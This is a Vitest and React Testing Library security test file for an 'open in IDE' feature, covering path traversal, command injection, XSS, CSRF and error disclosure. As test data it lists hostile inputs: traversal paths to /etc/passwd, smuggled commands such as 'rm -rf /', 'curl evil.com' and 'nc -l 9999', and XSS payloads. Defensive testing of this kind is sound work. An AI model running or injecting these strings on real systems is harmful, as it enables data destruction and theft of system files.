/**
 * Security Tests
 * Comprehensive security validation and path traversal protection tests
 */

import { describe, it, expect, beforeEach, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import React from 'react'
import { mockFetch, securityTestPayloads } from '../mocks/ideApi'
import { userInteraction } from '../utils/testHelpers'
import IDESelector from '../../presentation/components/common/IDESelector'
import OpenInIDEButton from '../../presentation/components/common/OpenInIDEButton'

// Mock hooks
const mockUseIDE = {
  preferredIDE: { id: 'vscode', name: 'Visual Studio Code', command: 'code' },
  availableIDEs: [],
  setIDE: vi.fn(),
  openInIDE: vi.fn(),
  isDetecting: false,
  error: null,
  getIDEsByCategory: vi.fn(() => ({ popular: [], jetbrains: [], terminal: [], mobile: [], apple: [], java: [], windows: [], deprecated: [], other: [] })),
  getAvailableIDEs: vi.fn(() => []),
  refreshIDEDetection: vi.fn()
}

vi.mock('../../hooks/useIDE', () => ({
  useIDE: () => mockUseIDE
}))

describe('Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    global.fetch = mockFetch()
  })

  describe('Path Traversal Protection', () => {
    it('should reject dangerous file paths through API validation', async () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\cmd.exe',
        '/etc/passwd',
        'C:\\Windows\\System32\\',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        './../../sensitive/file.txt',
        '~/../../../etc/hosts'
      ]

      for (const path of dangerousPaths) {
        // Mock API to return security error for dangerous paths
        global.fetch = vi.fn().mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({
            success: false,
            error: 'Security validation failed',
            message: 'Path contains potentially dangerous characters'
          })
        })

        mockUseIDE.openInIDE.mockRejectedValue(new Error('Security validation failed'))

        render(<OpenInIDEButton filePath={path} />)

        const button = screen.getByRole('button')
        await userInteraction.click(button)

        await waitFor(() => {
          expect(screen.getByText('Failed')).toBeInTheDocument()
        })

        // Clean up for next iteration
        screen.getByRole('button').blur()
      }
    })

    it('should allow safe file paths', async () => {
      const safePaths = [
        '/home/user/project/src/index.js',
        '/var/www/html/app.js',
        'C:\\Users\\User\\Documents\\project\\file.txt',
        './src/components/Button.jsx',
        'relative/path/to/file.js',
        '/absolute/safe/path/file.py'
      ]

      for (const path of safePaths) {
        mockUseIDE.openInIDE.mockResolvedValue({ success: true })

        render(<OpenInIDEButton filePath={path} />)

        const button = screen.getByRole('button')
        await userInteraction.click(button)

        await waitFor(() => {
          expect(screen.getByText('Opened!')).toBeInTheDocument()
        })
      }
    })

    it('should validate null byte injection attempts', async () => {
      const nullBytePayloads = [
        'safe.txt\x00../../../etc/passwd',
        'file.js%00../etc/hosts',
        'document.pdf\u0000rm -rf /',
        'script.sh\0cat /etc/passwd'
      ]

      for (const payload of nullBytePayloads) {
        mockUseIDE.openInIDE.mockRejectedValue(new Error('Invalid file path'))

        render(<OpenInIDEButton filePath={payload} />)

        const button = screen.getByRole('button')
        await userInteraction.click(button)

        await waitFor(() => {
          expect(screen.getByText('Failed')).toBeInTheDocument()
        })
      }
    })
  })

  describe('Command Injection Protection', () => {
    it('should validate custom IDE commands for dangerous characters', async () => {
      const dangerousCommands = [
        'code {path}; rm -rf /',
        'code {path} && cat /etc/passwd',
        'code {path} | curl evil.com',
        'code {path}`whoami`',
        'code {path}$(whoami)',
        'code {path}\nrm -rf /',
        'code {path}; shutdown -h now',
        'code {path} & nc -l 9999'
      ]

      render(<IDESelector />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      // Open custom command dialog
      const customButton = screen.getByText('Custom Command').closest('button')
      await userInteraction.click(customButton)

      const input = screen.getByPlaceholderText(/Enter your IDE command/)

      for (const command of dangerousCommands) {
        await userInteraction.clear(input)
        await userInteraction.type(input, command)

        const saveButton = screen.getByText('Save & Use')

        // Frontend should allow the input but backend should validate
        expect(saveButton).not.toBeDisabled()

        // Mock security validation on save
        mockUseIDE.openInIDE.mockRejectedValue(new Error('Command contains dangerous characters'))

        await userInteraction.click(saveButton)

        // Should fail when trying to execute
        await waitFor(() => {
          expect(mockUseIDE.setIDE).toHaveBeenCalled()
        })
      }
    })

    it('should allow safe custom IDE commands', async () => {
      const safeCommands = [
        'code {path}',
        'subl {path}',
        'webstorm {path}',
        'idea {path}',
        'vim {path}',
        'emacs {path}',
        '/usr/local/bin/code {path}',
        'C:\\Program Files\\IDE\\ide.exe {path}'
      ]

      render(<IDESelector />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      const customButton = screen.getByText('Custom Command').closest('button')
      await userInteraction.click(customButton)

      const input = screen.getByPlaceholderText(/Enter your IDE command/)

      for (const command of safeCommands) {
        await userInteraction.clear(input)
        await userInteraction.type(input, command)

        const saveButton = screen.getByText('Save & Use')
        await userInteraction.click(saveButton)

        expect(mockUseIDE.setIDE).toHaveBeenCalledWith({
          id: 'custom',
          name: 'Custom Command',
          command,
          available: true
        })
      }
    })
  })

  describe('XSS Protection', () => {
    it('should sanitize malicious input in custom command field', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onload="alert(\'xss\')"',
        '"><script>alert("xss")</script>',
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        'javascript:void(0)',
        'data:text/html,<script>alert("xss")</script>'
      ]

      render(<IDESelector />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      const customButton = screen.getByText('Custom Command').closest('button')
      await userInteraction.click(customButton)

      const input = screen.getByPlaceholderText(/Enter your IDE command/)

      for (const payload of xssPayloads) {
        await userInteraction.clear(input)
        await userInteraction.type(input, payload)

        // Input should contain the raw text, not execute as HTML
        expect(input.value).toBe(payload)

        // Ensure no script execution occurs (would be caught by Content Security Policy)
        expect(document.querySelectorAll('script')).toHaveLength(0)
      }
    })

    it('should not execute JavaScript in file paths', async () => {
      const jsPayloads = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file://C:/windows/system32/cmd.exe',
        'vbscript:msgbox("xss")'
      ]

      for (const payload of jsPayloads) {
        render(<OpenInIDEButton filePath={payload} />)

        const button = screen.getByRole('button')

        // Should not execute, just treat as invalid path
        await userInteraction.click(button)

        // No JavaScript should execute
        expect(document.querySelectorAll('script')).toHaveLength(0)
      }
    })
  })

  describe('Input Validation', () => {
    it('should validate file path length limits', async () => {
      // Test extremely long path
      const longPath = 'a'.repeat(5000) + '.js'

      mockUseIDE.openInIDE.mockRejectedValue(new Error('Path too long'))

      render(<OpenInIDEButton filePath={longPath} />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      await waitFor(() => {
        expect(screen.getByText('Failed')).toBeInTheDocument()
      })
    })

    it('should validate custom command length limits', async () => {
      const longCommand = 'code ' + 'a'.repeat(5000)

      render(<IDESelector />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      const customButton = screen.getByText('Custom Command').closest('button')
      await userInteraction.click(customButton)

      const input = screen.getByPlaceholderText(/Enter your IDE command/)

      // Input should have reasonable length limits
      await userInteraction.type(input, longCommand)

      const saveButton = screen.getByText('Save & Use')
      await userInteraction.click(saveButton)

      // Backend should validate command length
      mockUseIDE.openInIDE.mockRejectedValue(new Error('Command too long'))
    })

    it('should reject empty or whitespace-only commands', async () => {
      const invalidCommands = ['', '   ', '\t', '\n', '    \t\n  ']

      render(<IDESelector />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      const customButton = screen.getByText('Custom Command').closest('button')
      await userInteraction.click(customButton)

      const input = screen.getByPlaceholderText(/Enter your IDE command/)

      for (const command of invalidCommands) {
        await userInteraction.clear(input)
        await userInteraction.type(input, command)

        const saveButton = screen.getByText('Save & Use')
        expect(saveButton).toBeDisabled()
      }
    })
  })

  describe('CSRF Protection', () => {
    it('should include proper headers in API requests', async () => {
      const fetchSpy = vi.spyOn(global, 'fetch')

      mockUseIDE.openInIDE.mockResolvedValue({ success: true })

      render(<OpenInIDEButton filePath="/safe/path/file.js" />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      // Check that fetch was called with proper headers
      expect(fetchSpy).toHaveBeenCalledWith(
        '/api/project/open-in-ide',
        expect.objectContaining({
          method: 'POST',
          headers: expect.objectContaining({
            'Content-Type': 'application/json'
          })
        })
      )
    })

    it('should handle CSRF token validation errors', async () => {
      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          error: 'CSRF token validation failed',
          message: 'Invalid or missing CSRF token'
        })
      })

      mockUseIDE.openInIDE.mockRejectedValue(new Error('CSRF token validation failed'))

      render(<OpenInIDEButton filePath="/safe/path/file.js" />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      await waitFor(() => {
        expect(screen.getByText('Failed')).toBeInTheDocument()
      })
    })
  })

  describe('Rate Limiting', () => {
    it('should handle rate limiting gracefully', async () => {
      // Mock rate limit response
      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 429,
        json: () => Promise.resolve({
          error: 'Rate limit exceeded',
          message: 'Too many requests. Please try again later.'
        })
      })

      mockUseIDE.openInIDE.mockRejectedValue(new Error('Rate limit exceeded'))

      render(<OpenInIDEButton filePath="/safe/path/file.js" />)

      const button = screen.getByRole('button')

      // Simulate rapid clicks
      for (let i = 0; i < 10; i++) {
        await userInteraction.click(button)
      }

      await waitFor(() => {
        expect(screen.getByText('Failed')).toBeInTheDocument()
      })
    })
  })

  describe('Content Security Policy', () => {
    it('should not violate CSP by executing inline scripts', async () => {
      const maliciousContent = '<img src="x" onerror="alert(\'xss\')">'

      render(<IDESelector />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      const customButton = screen.getByText('Custom Command').closest('button')
      await userInteraction.click(customButton)

      const input = screen.getByPlaceholderText(/Enter your IDE command/)
      await userInteraction.type(input, maliciousContent)

      // Content should be safely rendered as text
      expect(input.value).toBe(maliciousContent)

      // No inline scripts should execute
      const images = document.querySelectorAll('img[onerror]')
      expect(images).toHaveLength(0)
    })

    it('should not load external resources from user input', async () => {
      const externalResources = [
        'http://evil.com/malicious.js',
        'https://attacker.com/steal-data',
        'ftp://malicious.com/file'
      ]

      for (const resource of externalResources) {
        render(<OpenInIDEButton filePath={resource} />)

        const button = screen.getByRole('button')
        await userInteraction.click(button)

        // Should not attempt to load external resources
        expect(global.fetch).not.toHaveBeenCalledWith(resource)
      }
    })
  })

  describe('Data Sanitization', () => {
    it('should sanitize file paths before display', () => {
      const unsafePath = '<script>alert("xss")</script>/file.js'

      render(<OpenInIDEButton filePath={unsafePath} />)

      const button = screen.getByRole('button')

      // Path should be displayed safely
      expect(button).toHaveAttribute('title', expect.stringContaining(unsafePath))

      // But no script tags should be in the DOM
      expect(document.querySelectorAll('script')).toHaveLength(0)
    })

    it('should sanitize IDE names before display', () => {
      mockUseIDE.preferredIDE = {
        id: 'malicious',
        name: '<img src="x" onerror="alert(\'xss\')">"Evil IDE"'
      }

      render(<OpenInIDEButton filePath="/safe/file.js" />)

      // IDE name should be displayed safely
      expect(screen.getByRole('button')).toBeInTheDocument()

      // No malicious elements should be created
      expect(document.querySelectorAll('img[onerror]')).toHaveLength(0)
    })
  })

  describe('Error Information Disclosure', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Mock detailed server error
      mockUseIDE.openInIDE.mockRejectedValue(new Error('ENOENT: no such file or directory, open \'/etc/shadow\''))

      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

      render(<OpenInIDEButton filePath="/some/path/file.js" />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      await waitFor(() => {
        expect(screen.getByText('Failed')).toBeInTheDocument()
      })

      // Error should be logged but not exposed to user
      expect(consoleSpy).toHaveBeenCalled()

      // User should only see generic error message
      expect(screen.queryByText('/etc/shadow')).not.toBeInTheDocument()

      consoleSpy.mockRestore()
    })

    it('should not expose system paths in error messages', async () => {
      mockUseIDE.openInIDE.mockRejectedValue(new Error('Command failed at /usr/local/bin/sensitive-tool'))

      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

      render(<OpenInIDEButton filePath="/safe/file.js" />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      await waitFor(() => {
        expect(screen.getByText('Failed')).toBeInTheDocument()
      })

      // System paths should not be visible to user
      expect(screen.queryByText('/usr/local/bin')).not.toBeInTheDocument()

      consoleSpy.mockRestore()
    })
  })

  describe('Session Security', () => {
    it('should handle session timeout gracefully', async () => {
      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({
          error: 'Session expired',
          message: 'Please log in again'
        })
      })

      mockUseIDE.openInIDE.mockRejectedValue(new Error('Session expired'))

      render(<OpenInIDEButton filePath="/safe/file.js" />)

      const button = screen.getByRole('button')
      await userInteraction.click(button)

      await waitFor(() => {
        expect(screen.getByText('Failed')).toBeInTheDocument()
      })
    })

    it('should not persist sensitive data in localStorage', () => {
      const sensitiveData = {
        id: 'custom',
        name: 'Custom IDE',
        command: 'secret-command-with-api-key-12345',
        apiKey: 'sensitive-api-key',
        password: 'secret-password'
      }

      mockUseIDE.setIDE(sensitiveData)

      // Check that sensitive fields are not stored
      const stored = localStorage.getItem('frigg_ide_preferences')
      if (stored) {
        const parsed = JSON.parse(stored)
        expect(parsed.apiKey).toBeUndefined()
        expect(parsed.password).toBeUndefined()
      }
    })
  })
})